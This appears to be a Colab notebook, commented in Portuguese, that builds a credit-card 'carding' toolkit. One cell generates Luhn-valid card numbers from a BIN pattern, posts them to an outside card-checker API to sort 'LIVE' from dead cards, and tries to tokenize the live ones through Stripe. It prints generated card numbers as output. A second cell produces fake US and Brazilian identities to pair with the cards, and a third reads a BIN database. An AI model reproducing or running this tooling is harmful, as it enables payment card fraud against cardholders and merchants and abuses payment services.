In [ ]:
!pip install stripe

In [ ]:
!pip install faker

   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.9/1.9 MB 34.5 MB/s eta 0:00:00


In [ ]:
!pip install requests re json

ERROR: Could not find a version that satisfies the requirement re (from versions: none)
ERROR: No matching distribution found for re


In [ ]:
import random
import time
import requests
import json
import concurrent.futures
from datetime import datetime
import threading
import os
import stripe

# Configuração da chave da Stripe
stripe.api_key = ""

# Símbolo decorativo
tilde = "{~}"

class CCGenerator:
    def __init__(self, bin_pattern, check_mode=0, quantity=0, max_workers=10):
        self.bin_pattern = bin_pattern
        self.check_mode = check_mode
        self.quantity = quantity
        self.max_workers = max_workers
        self.live_cards = []

        self.folder_name = "CARDS"
        os.makedirs(self.folder_name, exist_ok=True)

        self.filename = os.path.join(self.folder_name, "LIVE_CARDS.txt")
        self.final_result_file = "RESULTADOS_FINAIS.txt"

        self.bin_cache = {}
        self.lock = threading.Lock()
        self.delay_between_requests = 1.5
        self.request_counter = 0

    def color_text(self, color, text):
        colors = {
            'grey': '1;30',
            'red': '1;31',
            'green': '1;32',
            'yellow': '1;33',
            'blue': '1;34',
            'purple': '1;35',
            'nevy': '1;36',
            'white': '1;0',
        }
        return f"\033[{colors.get(color, '1;0')}m{text}\033[0m"

    def execute(self):
        print("###############################################")
        print(f"{tilde} Starting Card Generation")
        print(f"{tilde} Mode: {'GENERATE ONLY' if self.check_mode == 0 else 'GENERATE + CHECK'}")
        print(f"{tilde} Quantity: {self.quantity}")
        print(f"{tilde} BIN Pattern: {self.bin_pattern}")
        print(f"{tilde} Output Folder: {self.folder_name}")
        print(f"{tilde} Delay between requests: {self.delay_between_requests}s")
        print("###############################################")

        start_time = time.time()

        if self.check_mode == 0:
            self.generate_cards()
        else:
            self.generate_and_check_cards()
            self.validate_with_stripe()

        elapsed = time.time() - start_time
        print(f"\n{tilde} Operation completed in {elapsed:.2f} seconds")
        if self.live_cards:
            print(f"{tilde} Saved {len(self.live_cards)} LIVE cards to {self.filename}")

    def generate_cards(self):
        gen_file = os.path.join(self.folder_name, "GENERATED_CARDS.txt")
        with open(gen_file, "w") as f:
            for _ in range(self.quantity):
                card = self.generate_single_card()
                print(card)
                f.write(card + "\n")

    def generate_and_check_cards(self):
        cards = [self.generate_single_card() for _ in range(self.quantity)]

        all_cards_file = os.path.join(self.folder_name, "ALL_GENERATED_CARDS.txt")
        with open(all_cards_file, "w") as f:
            f.write("\n".join(cards))

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            semaphore = threading.Semaphore(3)

            def check_with_rate_control(card):
                with semaphore:
                    with self.lock:
                        self.request_counter += 1
                        if self.request_counter % 5 == 0:
                            time.sleep(self.delay_between_requests)
                    return self.check_single_card(card)

            for result in executor.map(check_with_rate_control, cards):
                card, status, color, country = result
                output = card + self.color_text(color, status)
                if country:
                    output += self.color_text("purple", f" | Country: {country}")
                print(output)

                if "LIVE" in status:
                    self.live_cards.append(card)

        if self.live_cards:
            with open(self.filename, "w") as f:
                f.write("\n".join(self.live_cards))

            summary_file = os.path.join(self.folder_name, "SUMMARY.txt")
            with open(summary_file, "w") as f:
                f.write(f"Card Generation Summary\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"BIN Pattern: {self.bin_pattern}\n")
                f.write(f"Total Cards Generated: {self.quantity}\n")
                f.write(f"Live Cards Found: {len(self.live_cards)}\n")
                f.write(f"Success Rate: {len(self.live_cards)/self.quantity:.2%}\n")

    def generate_single_card(self):
        base_bin = ''.join(str(random.randint(0, 9)) if c.lower() == 'x' else c for c in self.bin_pattern)
        cc_length = 16
        cc_number = base_bin[:cc_length - 1]  # reservamos 1 para o dígito verificador

        while len(cc_number) < cc_length - 1:
            cc_number += str(random.randint(0, 9))

        cc_number = self.calculate_luhn(cc_number)

        rand_month = f"{random.randint(1,12):02d}"
        rand_year = f"20{random.randint(20,25)}"
        rand_cvv = f"{random.randint(0,999):03d}"

        return f"{cc_number}|{rand_month}|{rand_year}|{rand_cvv}"

    def calculate_luhn(self, partial_cc):
        total = 0
        reverse_digits = partial_cc[::-1]

        for i, digit in enumerate(reverse_digits):
            num = int(digit)
            if i % 2 == 0:
                num *= 2
                if num > 9:
                    num -= 9
            total += num

        check_digit = (10 - (total % 10)) % 10
        return partial_cc + str(check_digit)

    def get_country_from_bin(self, bin):
        if bin in self.bin_cache:
            return self.bin_cache[bin]

        try:
            response = requests.get(
                f"https://lookup.binlist.net/{bin}",
                headers={
                    'Accept-Version': '3',
                    'User-Agent': 'Mozilla/5.0'
                },
                timeout=5
            )

            if response.status_code == 200:
                data = response.json()
                country = data.get('country', {}).get('name', 'Unknown')
                self.bin_cache[bin] = country
                return country
        except Exception:
            pass

        return 'Unknown'

    def check_single_card(self, card):
        headers = {
            'origin': 'https://uncoder.eu.org',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'referer': 'https://uncoder.eu.org/cc-checker/',
            'X-Requested-With': 'XMLHttpRequest'
        }

        country = ''
        try:
            bin_prefix = card.split('|')[0][:6]
            country = self.get_country_from_bin(bin_prefix)

            response = requests.post(
                "https://uncoder.eu.org/cc-checker/api.php",
                headers=headers,
                data=f"data={card}",
                timeout=15
            )

            if response.status_code == 200:
                result = response.json()
                error_code = result.get('error', 3)

                if error_code == 1:
                    return card, " [ LIVE ]", "green", country
                elif error_code == 2:
                    return card, " [ DIE ]", "red", country
                elif error_code == 4:
                    return card, " [ INVALID ]", "yellow", country

            return card, " [ UNKNOWN ]", "grey", country

        except Exception as e:
            return card, f" [ ERROR: {str(e)[:30]} ]", "red", country

    def validate_with_stripe(self):
        print("\n🔍 Validando LIVE cards com Stripe...")
        stripe_valid = []

        if not os.path.exists(self.filename):
            print(f"⚠️ Arquivo {self.filename} não encontrado para validação com Stripe.")
            return

        with open(self.filename, "r") as f:
            linhas = f.readlines()

        for card in linhas:
            partes = card.strip().split("|")

            if len(partes) != 4:
                continue

            card_number, month, year, cvv = partes

            try:
                token = stripe.Token.create(
                    card={
                        "number": card_number,
                        "exp_month": int(month),
                        "exp_year": int(year),
                        "cvc": cvv
                    }
                )
                print(f"✅ STRIPE VALID: {card.strip()}")
                stripe_valid.append(card.strip())
            except Exception as e:
                print(f"❌ STRIPE INVALID: {card.strip()} | {str(e)}")

        if stripe_valid:
            with open(self.final_result_file, "a") as f_out:
                for valid_card in stripe_valid:
                    f_out.write(valid_card + "\n")
            print(f"\n💾 {len(stripe_valid)} cards adicionados ao arquivo: {self.final_result_file}")
        else:
            print("⚠️ Nenhum cartão passou na validação da Stripe.")

if __name__ == "__main__":
    while True:
        BIN_PATTERN = input("Digite o BIN pattern (ex: 414720xxxxxx): ").strip()
        try:
            QUANTITY = int(input("Quantidade de cartões a gerar: "))
        except ValueError:
            print("Valor inválido para quantidade. Saindo.")
            break

        CHECK_MODE = 1
        MAX_WORKERS = 5
        REQUEST_DELAY = 1.0

        generator = CCGenerator(
            bin_pattern=BIN_PATTERN,
            check_mode=CHECK_MODE,
            quantity=QUANTITY,
            max_workers=MAX_WORKERS
        )
        generator.delay_between_requests = REQUEST_DELAY
        generator.execute()

        repetir = input("\nDeseja executar novamente? (s/n): ").lower()
        if repetir != 's':
            break


Digite o BIN pattern (ex: 414720xxxxxx): 456732
Quantidade de cartões a gerar: 10
###############################################
{~} Starting Card Generation
{~} Mode: GENERATE + CHECK
{~} Quantity: 10
{~} BIN Pattern: 456732
{~} Output Folder: CARDS
{~} Delay between requests: 1.0s
###############################################
4567323739853581|10|2025|183 [ ERROR: ('Connection aborted.', Remote ] | Country: United Kingdom of Great Britain and Northern Ireland (the)
4567322962837535|07|2020|399 [ ERROR: ('Connection aborted.', Remote ] | Country: Unknown
4567329636910754|03|2021|100 [ ERROR: ('Connection aborted.', Remote ] | Country: United Kingdom of Great Britain and Northern Ireland (the)
4567328151331099|08|2023|819 [ ERROR: HTTPSConnectionPool(host='unco ] | Country: United Kingdom of Great Britain and Northern Ireland (the)
4567322490863003|04|2020|971 [ ERROR: HTTPSConnectionPool(host='unco ] | Country: United Kingdom of Great Britain and Northern Ireland (the)
4567324814704

In [ ]:
import random
from faker import Faker
import json

# Configurações regionais
fake_us = Faker('en_US')
fake_br = Faker('pt_BR')

def generate_usa_identity():
    """Gera identidade completa americana"""
    state_data = fake_us.state_abbr(include_territories=False)
    return {
        "country": "USA",
        "first_name": fake_us.first_name(),
        "last_name": fake_us.last_name(),
        "address": fake_us.street_address(),
        "city": fake_us.city(),
        "state": state_data,
        "zip": fake_us.postcode_in_state(state_abbr=state_data),
        "phone": fake_us.phone_number(),
        "email": fake_us.email()
    }

def generate_brazil_identity():
    """Gera identidade completa brasileira"""
    return {
        "country": "Brazil",
        "first_name": fake_br.first_name(),
        "last_name": fake_br.last_name(),
        "address": fake_br.street_address(),
        "city": fake_br.city(),
        "state": fake_br.state_abbr(),
        "zip": fake_br.postcode(formatted=True),
        "phone": fake_br.phone_number(),
        "email": fake_br.email()
    }

def auto_fill_generator(country, quantity=1):
    """Gerador principal com formatação para ads"""
    results = []
    generator = generate_usa_identity if country.upper() == "USA" else generate_brazil_identity

    for _ in range(quantity):
        identity = generator()
        results.append({
            "🌎 País": identity["country"],
            "👤 Nome": f"{identity['first_name']} {identity['last_name']}",
            "🏡 Endereço": identity["address"],
            "🏙️ Cidade": identity["city"],
            "📍 Estado": identity["state"],
            "📮 CEP/ZIP": identity["zip"],
            "📱 Telefone": identity["phone"],
            "✉️ Email": identity["email"]
        })

    return json.dumps(results, indent=2, ensure_ascii=False)

# Exemplo de uso:
print(auto_fill_generator("USA", 1))
print(auto_fill_generator("Brazil", 1))

[
  {
    "🌎 País": "USA",
    "👤 Nome": "Noah Dawson",
    "🏡 Endereço": "57289 Michael Dam Apt. 031",
    "🏙️ Cidade": "New Daniellemouth",
    "📍 Estado": "HI",
    "📮 CEP/ZIP": "96812",
    "📱 Telefone": "220.772.3282x9718",
    "✉️ Email": "asmith@example.org"
  }
]
[
  {
    "🌎 País": "Brazil",
    "👤 Nome": "João Castro",
    "🏡 Endereço": "Colônia Luiz Miguel Aparecida, 97",
    "🏙️ Cidade": "das Neves",
    "📍 Estado": "RN",
    "📮 CEP/ZIP": "44757-549",
    "📱 Telefone": "61 5509-1816",
    "✉️ Email": "ravi-lucca60@example.net"
  }
]


In [ ]:
import sqlite3
import pandas as pd

# Caminho para o banco
db_path = "/content/bin.db"

# Conectar ao banco
conn = sqlite3.connect(db_path)

# Criar cursor para listar tabelas
cursor = conn.cursor()

# Listar as tabelas no banco
cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
tabelas = cursor.fetchall()

print("Tabelas encontradas no banco:")
for i, tabela in enumerate(tabelas):
    print(f"{i+1}: {tabela[0]}")

# Se houver alguma tabela, vamos ler a primeira com pandas
if tabelas:
    nome_tabela = tabelas[0][0]
    print(f"\nLendo dados da tabela: {nome_tabela}\n")
    df = pd.read_sql_query(f"SELECT * FROM {nome_tabela};", conn)
    print(df.head(100))
else:
    print("❌ Nenhuma tabela encontrada no banco.")

# Fechar conexão
conn.close()
